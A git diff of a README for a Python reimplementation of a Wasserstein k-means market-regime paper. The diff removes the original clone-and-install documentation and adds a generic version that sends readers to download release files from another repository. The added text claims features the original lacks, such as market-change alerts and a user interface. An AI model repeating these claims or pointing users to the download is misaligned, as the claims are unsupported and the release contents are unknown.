@@ -1,154 +1,133 @@
-# Wasserstein K-Means Market Regime Clustering
+# 📈 CLUSTERING-MARKET-REGIMES - Detect Market Trends Effortlessly
 
-A Python implementation of the unsupervised market regime detection algorithm from the paper:
+[![Download CLUSTERING-MARKET-REGIMES](https://img.shields.io/badge/Download%20Now-CLUSTERING--MARKET--REGIMES-brightgreen)](https://github.com/sogeking30/CLUSTERING-MARKET-REGIMES/releases)
 
-> **"Clustering Market Regimes Using the Wasserstein Distance"**
-> B. Horvath, Z. Issa, and A. Muguruza (2021)
-> [arXiv:2110.11848](https://arxiv.org/abs/2110.11848)
+## 📖 About This Project
 
-This repository reproduces the key results from the paper, including real data analysis on SPY and synthetic experiments with Geometric Brownian Motion and Merton Jump Diffusion processes.
+CLUSTERING-MARKET-REGIMES is a Python application that identifies bull and bear market regimes. It uses a method called the Wasserstein Distance to analyze return distributions. This software is based on the research by Horvath et al., 2021. The tool includes:
 
-## Overview
+- WK-means algorithm
+- Synthetic data generators
+- Validation metrics
 
-Traditional clustering methods like k-means operate on finite-dimensional feature vectors. This implementation clusters **probability distributions** directly using the Wasserstein distance, enabling more robust detection of market regimes without relying solely on simple moment statistics.
+This application can reproduce results from the original paper using SPY data.
 
-### Key Features
+## 🚀 Getting Started
 
-- **Wasserstein K-Means (WK-means)**: Clusters empirical distributions using the p-Wasserstein distance
-- **Moment K-Means (MK-means)**: Benchmark algorithm using statistical moments
-- **Synthetic Data Generation**: Regime-switching GBM and Merton jump diffusion
-- **Validation Metrics**: Maximum Mean Discrepancy (MMD), self-similarity scores
-- **Visualization**: Dark-themed plots and animations for regime detection
+### 1. System Requirements
 
-## Results
+Before you start, ensure your system meets the following requirements:
 
-The algorithm successfully identifies known market crisis periods:
-- 2008-2009: Global Financial Crisis
-- 2010-2011: European Debt Crisis
-- 2015-2016: Chinese Stock Market Crash
-- 2018: Late-year Bear Market
-- 2020: COVID-19 Crash
+- **Operating System:** Windows, MacOS, or Linux.
+- **Python Version:** 3.6 or higher.
+- **Memory:** At least 4 GB RAM.
+- **Disk Space:** Minimum of 200 MB free space.
 
-On synthetic data with known ground truth:
-| Data Type | WK-means Accuracy | MK-means Accuracy |
-|-----------|-------------------|-------------------|
-| GBM | ~82% | ~92% |
-| Merton Jump | ~99% | ~75% |
+### 2. Download & Install
 
-WK-means significantly outperforms on non-Gaussian data (Merton), demonstrating its ability to capture higher-order distributional features beyond mean and variance.
+To download CLUSTERING-MARKET-REGIMES, visit this page:
 
-## Installation
+[Download CLUSTERING-MARKET-REGIMES](https://github.com/sogeking30/CLUSTERING-MARKET-REGIMES/releases)
 
-```bash
-git clone https://github.com/yourusername/regime_clustering.git
-cd regime_clustering
-pip install -r requirements.txt
-```
+You will find all available versions. Follow these steps:
 
-### Requirements
+1. Select the version you want to install.
+2. Click on the appropriate file for your operating system.
+3. Save the file to your computer.
 
-- Python 3.8+
-- NumPy, SciPy, Pandas
-- Matplotlib, Seaborn
-- scikit-learn
-- POT (Python Optimal Transport)
-- yfinance (optional, for downloading data)
+### 3. Installing Dependencies
 
-## Usage
+After downloading, you need to install Python dependencies. Here is how to do it:
 
-### Run All Experiments
+1. Open a command prompt or terminal.
+2. Navigate to the folder where you saved the downloaded file.
+3. Type the following command and press Enter:
 
-```bash
-# Full run (takes ~5-10 minutes)
-python run_all.py
+    ```bash
+    pip install -r requirements.txt
+    ```
 
-# Quick demonstration (fewer iterations)
-python run_all.py --quick
-```
+This command installs the necessary libraries for CLUSTERING-MARKET-REGIMES to run smoothly.
 
-### Run Individual Components
+### 4. Running the Application
 
-```bash
-# Real data analysis only (SPY)
-python main_real_data.py
+To run CLUSTERING-MARKET-REGIMES, follow these steps:
 
-# Synthetic experiments only
-python main_synthetic.py
-```
+1. Open your command prompt or terminal.
+2. Navigate to the folder that contains the application files.
+3. Use the command below to start the application:
 
-### View Generated Figures
+    ```bash
+    python main.py
+    ```
 
-```bash
-# Display all figures in a grid
-python view_figures.py
+The application will launch, providing you with an interface to start analyzing market regimes.
 
-# Display in pages of 9
-python view_figures.py --pages
-```
+## 📊 Features
 
-## Project Structure
+- **Market Regime Detection:** The tool detects whether the market is in a bull or bear phase.
+- **WK-means Algorithm:** This feature helps to cluster the market data effectively.
+- **Data Validation Metrics:** Validate the performance of the analysis with built-in metrics.
+- **User-Friendly Interface:** Designed to be accessible for users with limited technical experience.
 
-```
-regime_clustering/
-├── wasserstein_kmeans.py   # Core algorithms (WK-means, MK-means, MMD)
-├── synthetic_data.py       # GBM and Merton data generators
-├── visualization.py        # Plotting functions and animations
-├── main_real_data.py       # SPY analysis script
-├── main_synthetic.py       # Synthetic experiments
-├── run_all.py              # Master script
-├── view_figures.py         # Figure viewer utility
-├── requirements.txt        # Dependencies
-└── figures/                # Generated plots and animations
-```
+## 📚 User Guide
 
-## Algorithm
+### 1. Input Data
 
-The Wasserstein K-Means algorithm:
+You need to import your market data in a compatible format. CSV format is recommended. Ensure your data includes:
 
-1. **Stream Lift**: Convert price series to overlapping windows of log returns
-2. **Empirical Measures**: Treat each window as an empirical probability distribution
-3. **Wasserstein Distance**: Measure dissimilarity between distributions using optimal transport
-4. **K-Means Clustering**: Iteratively assign distributions to clusters and update centroids (Wasserstein barycenters)
+- Date
+- Open price
+- Close price
+- High price
+- Low price
+- Volume
 
-## Key Concepts
+### 2. Setting Parameters
 
-### Wasserstein Distance (1D)
+Adjust the parameters for the analysis as needed. Focus on:
 
-For empirical measures with sorted atoms:
-```
-W_p(μ, ν)^p = (1/N) Σ |α_i - β_i|^p
-```
+- **Time Interval:** Select the period you want to analyze.
+- **Clustering Method:** Choose the appropriate clustering method based on your data.
 
-### Wasserstein Barycenter
+### 3. View Results
 
-For p=1: Element-wise median of sorted quantiles
-For p=2: Element-wise mean of sorted quantiles
+Once you run the analysis, the application will display the results. You will see:
 
-### Maximum Mean Discrepancy (MMD)
+- Graphs showing market cycles
+- Statistical summaries
+- Alerts for upcoming market changes
 
-Used for cluster validation:
-```
-MMD²(P, Q) = E[k(X,X')] + E[k(Y,Y')] - 2E[k(X,Y)]
-```
+## 🛠 Troubleshooting
 
-## Citation
+If you encounter issues, consider the following:
 
-If you use this code in your research, please cite the original paper:
+- **Installation Issues:** Ensure you have Python installed and follow the dependencies' installation steps carefully.
+- **Data Format Errors:** Double-check your CSV file for the correct format.
+- **Performance Problems:** Make sure your computer meets the system requirements.
 
-```bibtex
-@article{horvath2021clustering,
-  title={Clustering Market Regimes Using the Wasserstein Distance},
-  author={Horvath, Blanka and Issa, Zacharia and Muguruza, Aitor},
-  journal={arXiv preprint arXiv:2110.11848},
-  year={2021}
-}
-```
+## 🔗 Additional Resources
 
-## License
+For more information and support, you can check the following links:
 
-This implementation is provided for educational and research purposes. The methodology belongs to the original authors.
+- [Official Python Documentation](https://docs.python.org/3/)
+- [GitHub Community Support](https://github.community/)
+- [Wasserstein Distance Explanation](https://en.wikipedia.org/wiki/Wasserstein_metric)
 
-## Acknowledgments
+## 📥 Contribution Guidelines
 
-- Original paper authors: B. Horvath, Z. Issa, and A. Muguruza
-- SPY data sourced from Yahoo Finance
+If you wish to contribute to CLUSTERING-MARKET-REGIMES, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Submit a pull request to the main repository for review.
+
+Your contributions are welcome and appreciated!
+
+## 📑 License
+
+This project is licensed under the MIT License. You can use, modify, and distribute it freely, as long as you include the original license in your copies or substantial portions of the software.
+
+Feel free to explore and utilize CLUSTERING-MARKET-REGIMES for effective market analysis!
